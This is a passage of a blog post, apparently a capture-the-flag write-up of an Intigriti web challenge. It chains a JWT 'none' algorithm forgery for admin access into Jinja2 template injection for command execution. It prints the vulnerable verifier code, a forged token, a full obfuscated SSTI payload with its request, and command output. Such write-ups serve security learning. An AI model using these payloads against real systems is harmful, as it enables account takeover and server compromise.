<!DOCTYPE html>
<html 
  lang="en" 
  dir="ltr">

<head>
  <link rel="icon" href="https://machiavelli.me/icons/favicon.ico" type="image/x-icon">
  <link rel="shortcut icon" href="https://machiavelli.me/icons/favicon.ico" type="image/x-icon">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  
  
  <meta name="description" content="|_337 |-|4&gt;&lt;0R?" />
  
  

  <title>
    
    Intigriti November 2025 Challenge
    
</title>
  <link rel="alternate" type="application/atom+xml" title="Machiavelli&#x27;s Homepage Atom Feed" href="https://machiavelli.me/atom.xml" />

  
  <link rel="stylesheet" href="https://machiavelli.me/site.css">
  

  
  
</head>

<body class="hack dark main container">
  
    
        
  
  <header class="nav-header">
    <nav itemscope itemtype="http://schema.org/SiteNavigationElement" class="navbar">
      <div class="nav-links">
        
        <a itemprop="url"
          class=""
          href="https://machiavelli.me">
          <span itemprop="name">Home</span></a>
        
        <a itemprop="url"
          class=""
          href="https://machiavelli.me/rquotes">
          <span itemprop="name">rquotes</span></a>
        
        <a itemprop="url"
          class=""
          href="https://machiavelli.me/lolbas">
          <span itemprop="name">lolbas</span></a>
        
      </div>
    </nav>
    
    <div class="search-container">
      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" class="search-icon">
        <path stroke-linecap="round" stroke-linejoin="round"
          d="m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607Z" />
      </svg>
      <input type="text" id="search" placeholder="Search...">
      <div class="search-results">
        <div class="search-results__items"></div>
      </div>
    </div>
    

  </header>
  
  
    

<article itemscope itemtype="http://schema.org/BlogPosting">
    <header>
        <h1 itemprop="headline">Intigriti November 2025 Challenge</h1>
        <span class="muted">
    <svg class="icon i-clock" viewBox="0 0 32 32"
         width="16" height="16" fill="none" stroke="currentcolor"
         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
        <circle cx="16" cy="16" r="14"/>
        <path d="M16 8 L16 16 20 20"/>
    </svg>
    <span>3 minute read</span>
    <svg class="icon i-edit" viewBox="0 0 32 32"
         width="16" height="16" fill="none" stroke="currentcolor"
         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
        <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"/>
    </svg>

    Published: 2025-11-24
</span>
    </header>
        
        <nav aria-label="Table of contents">
        <details>
            <summary role="button" style="padding: 0rem 0rem 0rem 0rem;margin: 1rem 0rem 1.5rem 0rem;">
            Table of Contents
            <br>
            </summary>
            <ul>
            
                <li>
                <a href="https://machiavelli.me/intigriti-challenge-1125/#basic-recon">Basic Recon</a>
                
                    <ul>
                    
                        <li>
                        <a href="https://machiavelli.me/intigriti-challenge-1125/#client-request">Client Request:</a>
                        
                        </li>
                    
                        <li>
                        <a href="https://machiavelli.me/intigriti-challenge-1125/#server-response-with-jwt">Server Response with JWT:</a>
                        
                        </li>
                    
                    </ul>
                
                </li>
            
                <li>
                <a href="https://machiavelli.me/intigriti-challenge-1125/#jwt-none-algorithm-attack-to-privilege-escalation">JWT None Algorithm Attack to Privilege Escalation</a>
                
                </li>
            
                <li>
                <a href="https://machiavelli.me/intigriti-challenge-1125/#server-side-template-injection-to-remote-code-execution">Server-side Template Injection to Remote Code Execution</a>
                
                </li>
            
                <li>
                <a href="https://machiavelli.me/intigriti-challenge-1125/#c0ngr4ts">C0ngr4ts!</a>
                
                </li>
            
            </ul>
        </details>
        </nav>


    <div itemprop="articleBody">
      <p>The challenge was easy and straightforward: no quirks, no rabbit holes.</p>
<span id="continue-reading"></span><h2 id="basic-recon">Basic Recon</h2>
<div class="image-container" style="width: 100%; max-width: 600%; margin: 2.5rem auto; text-align: center;">
    <img 
      src="https:&#x2F;&#x2F;machiavelli.me&#x2F;intigriti-challenge-1125&#x2F;assets/images/challenge-1125-intigriti-io-browse.png" 
      alt="main" 
      style="
        max-width: 100%; 
        height: auto; 
        display: block; 
        margin: 0 auto; 
        border-radius: 8px; 
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
      "
      loading="lazy"
    >
    
  </div>
<p>The web application was a basic and simple ecommerce app with login and signup functionalities, so let's first create an account.</p>
<p>After registering and reviewing the HTTP history in Burp Suite, ZAP, or your preferred tool, the server issued a JWT that looks promising for testing multiple vulnerabilities which could lead to <code>RCE</code> in the end.</p>
<h3 id="client-request">Client Request:</h3>
<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">POST /register HTTP/2
</span><span style="color:#abb2bf;">Host: challenge-1125.intigriti.io
</span><span style="color:#abb2bf;">Content-Length: 41
</span><span style="color:#abb2bf;">Origin: https://challenge-1125.intigriti.io
</span><span style="color:#abb2bf;">Content-Type: application/x-www-form-urlencoded
</span><span style="color:#abb2bf;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
</span><span style="color:#abb2bf;">Referer: https://challenge-1125.intigriti.io/register
</span><span style="color:#abb2bf;">Accept-Encoding: gzip, deflate, br
</span><span style="color:#abb2bf;">
</span><span style="color:#abb2bf;">username=machiavelli&amp;password=machiavelli
</span></code></pre>
<h3 id="server-response-with-jwt">Server Response with <code>JWT</code>:</h3>
<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">HTTP/2 302 Found
</span><span style="color:#abb2bf;">Date: Fri, 21 Nov 2025 09:44:02 GMT
</span><span style="color:#abb2bf;">Content-Type: text/html; charset=utf-8
</span><span style="color:#abb2bf;">Content-Length: 207
</span><span style="color:#abb2bf;">Location: /dashboard
</span><span style="color:#abb2bf;">Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozNSwidXNlcm5hbWUiOiJtYWNoaWF2ZWxsaSIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzYzODA0NjQxfQ.Tn_fQNJpUqGfd4ViDTPMN95rPoGk1XYOLRu8D94D7PQ; Expires=Sat, 22 Nov 2025 09:44:01 GMT; Max-Age=86400; HttpOnly; Path=/
</span><span style="color:#abb2bf;">Vary: Cookie
</span><span style="color:#abb2bf;">Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIkFjY291bnQgY3JlYXRlZCBzdWNjZXNzZnVsbHkhIl19XX0.aSA0Yg.-1mcqIFXwlE5O-01QE7X-EiFr9s; HttpOnly; Path=/
</span><span style="color:#abb2bf;">Strict-Transport-Security: max-age=31536000; includeSubDomains
</span><span style="color:#abb2bf;">
</span><span style="color:#abb2bf;">&lt;!doctype html&gt;
</span><span style="color:#abb2bf;">&lt;html lang=en&gt;
</span><span style="color:#abb2bf;">&lt;title&gt;Redirecting...&lt;/title&gt;
</span><span style="color:#abb2bf;">&lt;h1&gt;Redirecting...&lt;/h1&gt;
</span><span style="color:#abb2bf;">&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;/dashboard&quot;&gt;/dashboard&lt;/a&gt;. If not, click the link.
</span><span style="color:#abb2bf;">
</span></code></pre>
<p>After decoding the token, we can see it contains the following claims with user information:</p>
<pre data-lang="json" style="background-color:#2b303b;color:#6c7079;" class="language-json "><code class="language-json" data-lang="json"><span style="color:#abb2bf;">
</span><span style="color:#abb2bf;">{
</span><span style="color:#abb2bf;">  </span><span style="color:#9acc76;">&quot;alg&quot;</span><span style="color:#abb2bf;">: </span><span style="color:#9acc76;">&quot;HS256&quot;</span><span style="color:#abb2bf;">,
</span><span style="color:#abb2bf;">  </span><span style="color:#9acc76;">&quot;typ&quot;</span><span style="color:#abb2bf;">: </span><span style="color:#9acc76;">&quot;JWT&quot;
</span><span style="color:#abb2bf;">}
</span><span style="color:#abb2bf;">.
</span><span style="color:#abb2bf;">{
</span><span style="color:#abb2bf;">  </span><span style="color:#9acc76;">&quot;user_id&quot;</span><span style="color:#abb2bf;">: </span><span style="color:#db9d63;">35</span><span style="color:#abb2bf;">,
</span><span style="color:#abb2bf;">  </span><span style="color:#9acc76;">&quot;username&quot;</span><span style="color:#abb2bf;">: </span><span style="color:#9acc76;">&quot;machiavelli&quot;</span><span style="color:#abb2bf;">,
</span><span style="color:#abb2bf;">  </span><span style="color:#9acc76;">&quot;role&quot;</span><span style="color:#abb2bf;">: </span><span style="color:#9acc76;">&quot;user&quot;</span><span style="color:#abb2bf;">,
</span><span style="color:#abb2bf;">  </span><span style="color:#9acc76;">&quot;exp&quot;</span><span style="color:#abb2bf;">: </span><span style="color:#db9d63;">1763804641
</span><span style="color:#abb2bf;">}
</span></code></pre>
<h2 id="jwt-none-algorithm-attack-to-privilege-escalation">JWT None Algorithm Attack to Privilege Escalation</h2>
<blockquote>
<p>You'll need to install the JWT Editor extension from the BApp Store (or you can use jwt_tool), but it’s much easier to forge and manipulate the token directly inside Burp Suite using JWT Editor.</p>
</blockquote>
<p>The main goal of manipulating a JWT is to escalate privileges (e.g., become an admin) or impersonate another user.<br />
This is only possible if we can create a token that the server accepts as valid.</p>
<p>There are two common scenarios:</p>
<ol>
<li>
<p><strong>The server properly verifies the signature</strong><br />
We need to know (or guess/crack) the secret key used with HS256 so we can re-sign our forged token. Once the server verifies the signature as legitimate, it trusts the claims (<code>role</code>, <code>username</code>, <code>user_id</code>, etc.) and grants the corresponding privileges.</p>
</li>
<li>
<p><strong>The server does NOT verify the signature</strong> (the actual vulnerability in this challenge)<br />
We can impersonate any user and assign any privilege we want without knowing the secret — simply by sending an unsigned token, using the "none" algorithm, or tampering with the signature without re-signing or even omitting it.</p>
</li>
</ol>
<p>Here is the vulnerable code extracted from the challenge after achieving RCE inside <code>/app/utils/jwt_handler.py</code>:</p>
<pre data-lang="python" style="background-color:#2b303b;color:#6c7079;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#abb2bf;">
</span><span style="color:#cd74e8;">def </span><span style="color:#5cb3fa;">verify_token</span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">payload</span><span style="color:#abb2bf;">, </span><span style="color:#eb6772;">algorithm</span><span style="color:#adb7c9;">=</span><span style="color:#9acc76;">&quot;HS256&quot;</span><span style="color:#abb2bf;">):
</span><span style="color:#abb2bf;">    token </span><span style="color:#adb7c9;">= </span><span style="color:#abb2bf;">jwt.</span><span style="color:#eb6772;">encode</span><span style="color:#abb2bf;">(payload, </span><span style="color:#eb6772;">SECRET_KEY</span><span style="color:#abb2bf;">, </span><span style="color:#eb6772;">algorithm</span><span style="color:#adb7c9;">=</span><span style="color:#abb2bf;">algorithm)
</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">return </span><span style="color:#abb2bf;">token
</span><span style="color:#abb2bf;">
</span><span style="color:#cd74e8;">def </span><span style="color:#5cb3fa;">verify_token</span><span style="color:#abb2bf;">(</span><span style="color:#eb6772;">token</span><span style="color:#abb2bf;">):
</span><span style="color:#abb2bf;">    </span><span style="font-style:italic;color:#5f697a;">&quot;&quot;&quot;Verify and decode JWT token&quot;&quot;&quot;
</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">try</span><span style="color:#abb2bf;">:
</span><span style="color:#abb2bf;">        header </span><span style="color:#adb7c9;">= </span><span style="color:#abb2bf;">jwt.</span><span style="color:#eb6772;">get_unverified_header</span><span style="color:#abb2bf;">(token)
</span><span style="color:#abb2bf;">        
</span><span style="color:#abb2bf;">        </span><span style="font-style:italic;color:#5f697a;"># @TODO: Add validation for session tokens! We currently
</span><span style="color:#abb2bf;">        </span><span style="font-style:italic;color:#5f697a;"># need this for a new feature to allow sharing cart items (still WIP)
</span><span style="color:#abb2bf;">        </span><span style="color:#cd74e8;">if </span><span style="color:#abb2bf;">header.</span><span style="color:#eb6772;">get</span><span style="color:#abb2bf;">(</span><span style="color:#9acc76;">&#39;alg&#39;</span><span style="color:#abb2bf;">) </span><span style="color:#adb7c9;">== </span><span style="color:#9acc76;">&#39;none&#39;</span><span style="color:#abb2bf;">:
</span><span style="color:#abb2bf;">            </span><span style="font-style:italic;color:#5f697a;"># CRITICAL VULNERABILITY: blindly trusts &quot;none&quot; algorithm
</span><span style="color:#abb2bf;">            decoded </span><span style="color:#adb7c9;">= </span><span style="color:#abb2bf;">jwt.</span><span style="color:#eb6772;">decode</span><span style="color:#abb2bf;">(
</span><span style="color:#abb2bf;">                token,
</span><span style="color:#abb2bf;">                </span><span style="color:#eb6772;">options</span><span style="color:#adb7c9;">=</span><span style="color:#abb2bf;">{</span><span style="color:#9acc76;">&quot;verify_signature&quot;</span><span style="color:#abb2bf;">: </span><span style="color:#db9d63;">False</span><span style="color:#abb2bf;">}  </span><span style="font-style:italic;color:#5f697a;"># No signature check at all
</span><span style="color:#abb2bf;">            )
</span><span style="color:#abb2bf;">            </span><span style="color:#cd74e8;">return </span><span style="color:#abb2bf;">decoded
</span><span style="color:#abb2bf;">        </span><span style="color:#cd74e8;">else</span><span style="color:#abb2bf;">:
</span><span style="color:#abb2bf;">            decoded </span><span style="color:#adb7c9;">= </span><span style="color:#abb2bf;">jwt.</span><span style="color:#eb6772;">decode</span><span style="color:#abb2bf;">(
</span><span style="color:#abb2bf;">                token,
</span><span style="color:#abb2bf;">                </span><span style="color:#eb6772;">SECRET_KEY</span><span style="color:#abb2bf;">,
</span><span style="color:#abb2bf;">                </span><span style="color:#eb6772;">algorithms</span><span style="color:#adb7c9;">=</span><span style="color:#abb2bf;">[</span><span style="color:#9acc76;">&#39;HS256&#39;</span><span style="color:#abb2bf;">]
</span><span style="color:#abb2bf;">            )
</span><span style="color:#abb2bf;">            </span><span style="color:#cd74e8;">return </span><span style="color:#abb2bf;">decoded
</span><span style="color:#abb2bf;">            
</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">except </span><span style="color:#abb2bf;">jwt.ExpiredSignatureError:
</span><span style="color:#abb2bf;">        </span><span style="color:#cd74e8;">return </span><span style="color:#db9d63;">None
</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">except </span><span style="color:#abb2bf;">jwt.InvalidTokenError:
</span><span style="color:#abb2bf;">        </span><span style="color:#cd74e8;">return </span><span style="color:#db9d63;">None
</span><span style="color:#abb2bf;">    </span><span style="color:#cd74e8;">except </span><span style="color:#abb2bf;">Exception:
</span><span style="color:#abb2bf;">        </span><span style="color:#cd74e8;">return </span><span style="color:#db9d63;">None
</span></code></pre>
<p>The code explicitly allows the <code>alg=none</code> case and skips signature verification entirely.</p>
<p>Send a request containing the JWT to <strong>Burp Repeater</strong>.</p>
<p>Then:</p>
<ol>
<li>Switch to the <strong>JSON Web Tokens</strong> tab (provided by the JWT Editor extension).</li>
<li>In the payload section, modify the claims as follows:
<ul>
<li><code>"user_id": 1</code></li>
<li><code>"username": "admin"</code></li>
<li><code>"role": "admin"</code></li>
</ul>
</li>
</ol>
<p>The edited payload should now look like this:</p>
<pre data-lang="json" style="background-color:#2b303b;color:#6c7079;" class="language-json "><code class="language-json" data-lang="json"><span style="color:#abb2bf;">
</span><span style="color:#abb2bf;">{
</span><span style="color:#abb2bf;">  </span><span style="color:#9acc76;">&quot;user_id&quot;</span><span style="color:#abb2bf;">: </span><span style="color:#db9d63;">1</span><span style="color:#abb2bf;">,
</span><span style="color:#abb2bf;">  </span><span style="color:#9acc76;">&quot;username&quot;</span><span style="color:#abb2bf;">: </span><span style="color:#9acc76;">&quot;admin&quot;</span><span style="color:#abb2bf;">,
</span><span style="color:#abb2bf;">  </span><span style="color:#9acc76;">&quot;role&quot;</span><span style="color:#abb2bf;">: </span><span style="color:#9acc76;">&quot;admin&quot;</span><span style="color:#abb2bf;">,
</span><span style="color:#abb2bf;">  </span><span style="color:#9acc76;">&quot;exp&quot;</span><span style="color:#abb2bf;">: </span><span style="color:#db9d63;">1763804641
</span><span style="color:#abb2bf;">}
</span></code></pre>
<p>Click on <code>Attack</code> and then sign the token with <code>none</code> algorithm and send the request.</p>
<p>Then hit the <code>/admin</code> endpoint in Burp or copy the forged token and add it using the Cookie Editor extension in your browser.</p>
<p>After browsing multiple endpoints in search of an RCE vector — such as <code>/admin/orders</code>, <code>/admin/users</code>, and <code>/admin/products</code> — I found nothing useful.</p>
<p>That changed when I finally hit <code>/admin/profile</code>.</p>
<h2 id="server-side-template-injection-to-remote-code-execution">Server-side Template Injection to Remote Code Execution</h2>
<p>The admin profile’s current display name is clearly the result of server-side code execution based on whatever value is submitted in the Display Name field.</p>
<div class="image-container" style="width: 100%; max-width: 600%; margin: 2.5rem auto; text-align: center;">
    <img 
      src="https:&#x2F;&#x2F;machiavelli.me&#x2F;intigriti-challenge-1125&#x2F;assets/images/challenge-1125-intigriti-io-admin-profile.png" 
      alt="admin profile" 
      style="
        max-width: 100%; 
        height: auto; 
        display: block; 
        margin: 0 auto; 
        border-radius: 8px; 
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
      "
      loading="lazy"
    >
    
  </div>
<p>So let's focus on that field — it's our RCE entry point.</p>
<p>The Display Name field contains a heavily obfuscated Jinja2 SSTI payload (identifiable by the {% raw %}<code>{% %}</code> {% endraw %} statement syntax) that currently executes <code>ls /usr/share</code>.</p>
<p>Here is the full payload:
{% raw %}</p>
<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">{%set at=dict(rtta=x)|first|reverse%}{%set nd=dict(so=x)|first|reverse%}{%set ls=&#39;ls /usr/share&#39;%}{%set re=dict(daer=x)|first|reverse%}{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}{%set uj=dict(a=x,b=x,c=x)|length%}{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}{%set in=dict(tini=x)|first|reverse%}{%set ii=()|select|string|batch(lla+lla+uj)|first|last*(la+la)+in+()|select|string|batch(lla+lla+uj)|first|last*(la+la)%}{%set gl=dict(slabolg=x)|first|reverse%}{%set go=()|select|string|batch(lla+lla+uj)|first|last*(la+la)+gl+()|select|string|batch(lla+lla+uj)|first|last*(la+la)%}{%set ge=dict(metiteg=x)|first|reverse%}{%set gi=()|select|string|batch(lla+lla+uj)|first|last*(la+la)+ge+()|select|string|batch(lla+lla+uj)|first|last*(la+la)%}{%set bu=dict(snitliub=x)|first|reverse%}{%set bl=()|select|string|batch(lla+lla+uj)|first|last*(la+la)+bu+()|select|string|batch(lla+lla+uj)|first|first|last*(la+la)%}{%set im=dict(tropmi=x)|first|reverse%}{%set ip=()|select|string|batch(lla+lla+uj)|first|last*(la+la)+im+()|select|string|batch(lla+lla+uj)|first|last*(la+la)%}{%set cx=dict(aaaaa=x)|first|length%}{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}{%set ob={}|int%}{%set lb=ob**ob%}{%set llb=(lb~lb)|int%}{%set lllb=(llb~lb)|int%}{%set llllb=(lllb~lb)|int%}{%set bb=llb-lb-lb-lb-lb-lb%}{%set sbb=lllb-llb-llb-llb-llb-llb%}{%set ssbb=llllb-lllb-lllb-lllb-lllb-lllb%}{%set zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%}{%set ob={}|int%}{%set lb=ob**ob%}{%set llb=(lb~lb)|int%}{%set lllb=(llb~lb)|int%}{%set llllb=(lllb~lb)|int%}{%set bb=llb-lb-lb-lb-lb-lb%}{%set sbb=lllb-llb-llb-llb-llb-llb%}{%set ssbb=llllb-lllb-lllb-lllb-lllb-lllb%}{%set zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%}{%set dp=uj+la%}{%set et=lla+lla+lla+dp%}{%set po=(({}|escape|urlencode|first+dict(c=x)|join)*cx)%(llla+la,llla,llla+la,sbb+et+bb+la+la,sbb+et+lla+bb)%}{%print (((((((((((x,)|map(at,ii)|first,)|map(at,go)|first,)|map(at,gi)|first)(bl),)|map(at,gi)|first)(ip))(nd),)|map(at,po)|first)(ls),)|map(at,re)|first)()%}
</span></code></pre>
<p>{% endraw %}</p>
<p>Let's change ls <code>/usr/share</code> to ls <code>/app</code> by sending a POST request to <code>/admin/profile</code> containing the modified Jinja2 payload.</p>
<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">POST /admin/profile HTTP/2
</span><span style="color:#abb2bf;">Host: challenge-1125.intigriti.io
</span><span style="color:#abb2bf;">Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzYzODA0NjQxfQ.
</span><span style="color:#abb2bf;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
</span><span style="color:#abb2bf;">Content-Type: application/x-www-form-urlencoded
</span><span style="color:#abb2bf;">Content-Length: 3740
</span><span style="color:#abb2bf;">
</span><span style="color:#abb2bf;">display_name=%7B%25set%20at%3Ddict%28rtta%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20nd%3Ddict%28so%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20ls%3D%27ls%20%2F%20%27%25%7D%7B%25set%20re%3Ddict%28daer%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20oa%3D%7B%7D%7Cint%25%7D%7B%25set%20la%3Doa%2A%2Aoa%25%7D%7B%25set%20lla%3D%28la%7Ela%29%7Cint%25%7D%7B%25set%20llla%3D%28lla%7Ela%29%7Cint%25%7D%7B%25set%20lllla%3D%28llla%7Ela%29%7Cint%25%7D%7B%25set%20uj%3Ddict%28a%3Dx%2Cb%3Dx%2Cc%3Dx%29%7Clength%25%7D%7B%25set%20oa%3D%7B%7D%7Cint%25%7D%7B%25set%20la%3Doa%2A%2Aoa%25%7D%7B%25set%20lla%3D%28la%7Ela%29%7Cint%25%7D%7B%25set%20llla%3D%28lla%7Ela%29%7Cint%25%7D%7B%25set%20lllla%3D%28llla%7Ela%29%7Cint%25%7D%7B%25set%20in%3Ddict%28tini%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20ii%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bin%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20gl%3Ddict%28slabolg%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20go%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bgl%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20ge%3Ddict%28metiteg%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20gi%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bge%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20bu%3Ddict%28snitliub%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20bl%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bbu%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20im%3Ddict%28tropmi%3Dx%29%7Cfirst%7Creverse%25%7D%7B%25set%20ip%3D%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%2Bim%2B%28%29%7Cselect%7Cstring%7Cbatch%28lla%2Blla%2Buj%29%7Cfirst%7Clast%2A%28la%2Bla%29%25%7D%7B%25set%20cx%3Ddict%28aaaaa%3Dx%29%7Cfirst%7Clength%25%7D%7B%25set%20oa%3D%7B%7D%7Cint%25%7D%7B%25set%20la%3Doa%2A%2Aoa%25%7D%7B%25set%20lla%3D%28la%7Ela%29%7Cint%25%7D%7B%25set%20llla%3D%28lla%7Ela%29%7Cint%25%7D%7B%25set%20lllla%3D%28llla%7Ela%29%7Cint%25%7D%7B%25set%20ob%3D%7B%7D%7Cint%25%7D%7B%25set%20lb%3Dob%2A%2Aob%25%7D%7B%25set%20llb%3D%28lb%7Elb%29%7Cint%25%7D%7B%25set%20lllb%3D%28llb%7Elb%29%7Cint%25%7D%7B%25set%20llllb%3D%28lllb%7Elb%29%7Cint%25%7D%7B%25set%20bb%3Dllb%2Dlb%2Dlb%2Dlb%2Dlb%2Dlb%25%7D%7B%25set%20sbb%3Dlllb%2Dllb%2Dllb%2Dllb%2Dllb%2Dllb%25%7D%7B%25set%20ssbb%3Dllllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%25%7D%7B%25set%20zzeb%3Dllllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%25%7D%7B%25set%20ob%3D%7B%7D%7Cint%25%7D%7B%25set%20lb%3Dob%2A%2Aob%25%7D%7B%25set%20llb%3D%28lb%7Elb%29%7Cint%25%7D%7B%25set%20lllb%3D%28llb%7Elb%29%7Cint%25%7D%7B%25set%20llllb%3D%28lllb%7Elb%29%7Cint%25%7D%7B%25set%20bb%3Dllb%2Dlb%2Dlb%2Dlb%2Dlb%2Dlb%25%7D%7B%25set%20sbb%3Dlllb%2Dllb%2Dllb%2Dllb%2Dllb%2Dllb%25%7D%7B%25set%20ssbb%3Dllllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%25%7D%7B%25set%20zzeb%3Dllllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%2Dlllb%25%7D%7B%25set%20dp%3Duj%2Bla%25%7D%7B%25set%20et%3Dlla%2Blla%2Blla%2Bdp%25%7D%7B%25set%20po%3D%28%28%7B%7D%7Cescape%7Curlencode%7Cfirst%2Bdict%28c%3Dx%29%7Cjoin%29%2Acx%29%25%28llla%2Bla%2Cllla%2Cllla%2Bla%2Csbb%2Bet%2Bbb%2Bla%2Bla%2Csbb%2Bet%2Blla%2Bbb%29%25%7D%7B%25print%20%28%28%28%28%28%28%28%28%28%28%28x%2C%29%7Cmap%28at%2Cii%29%7Cfirst%2C%29%7Cmap%28at%2Cgo%29%7Cfirst%2C%29%7Cmap%28at%2Cgi%29%7Cfirst%29%28bl%29%2C%29%7Cmap%28at%2Cgi%29%7Cfirst%29%28ip%29%29%28nd%29%2C%29%7Cmap%28at%2Cpo%29%7Cfirst%29%28ls%29%2C%29%7Cmap%28at%2Cre%29%7Cfirst%29%28%29%25%7D
</span></code></pre>
<p>Notice the content of the root directory <code>/</code>:</p>
<pre data-lang="html" style="background-color:#2b303b;color:#6c7079;" class="language-html "><code class="language-html" data-lang="html"><span style="color:#abb2bf;">
</span><span style="font-style:italic;color:#5f697a;">&lt;!-- Current Display Name --&gt;
</span><span style="color:#abb2bf;">&lt;</span><span style="color:#eb6772;">div </span><span style="color:#db9d63;">class</span><span style="color:#abb2bf;">=</span><span style="color:#9acc76;">&quot;mb-8&quot;</span><span style="color:#abb2bf;">&gt;
</span><span style="color:#abb2bf;">  &lt;</span><span style="color:#eb6772;">label </span><span style="color:#db9d63;">class</span><span style="color:#abb2bf;">=</span><span style="color:#9acc76;">&quot;block text-sm font-semibold text-slate-300 mb-3&quot;</span><span style="color:#abb2bf;">&gt;Current Display Name&lt;/</span><span style="color:#eb6772;">label</span><span style="color:#abb2bf;">&gt;
</span><span style="color:#abb2bf;">    &lt;</span><span style="color:#eb6772;">div </span><span style="color:#db9d63;">class</span><span style="color:#abb2bf;">=</span><span style="color:#9acc76;">&quot;p-4 bg-slate-700/50 border border-slate-600 rounded-lg&quot;</span><span style="color:#abb2bf;">&gt;
</span><span style="color:#abb2bf;">      &lt;</span><span style="color:#eb6772;">p </span><span style="color:#db9d63;">class</span><span style="color:#abb2bf;">=</span><span style="color:#9acc76;">&quot;text-slate-100 font-medium&quot;</span><span style="color:#abb2bf;">&gt;
</span><span style="color:#abb2bf;">app
</span><span style="color:#abb2bf;">bin
</span><span style="color:#abb2bf;">boot
</span><span style="color:#abb2bf;">dev
</span><span style="color:#abb2bf;">etc
</span><span style="color:#abb2bf;">home
</span><span style="color:#abb2bf;">lib
</span><span style="color:#abb2bf;">lib64
</span><span style="color:#abb2bf;">media
</span><span style="color:#abb2bf;">mnt
</span><span style="color:#abb2bf;">opt
</span><span style="color:#abb2bf;">proc
</span><span style="color:#abb2bf;">root
</span><span style="color:#abb2bf;">run
</span><span style="color:#abb2bf;">sbin
</span><span style="color:#abb2bf;">srv
</span><span style="color:#abb2bf;">sys
</span><span style="color:#abb2bf;">tmp
</span><span style="color:#abb2bf;">usr
</span><span style="color:#abb2bf;">var
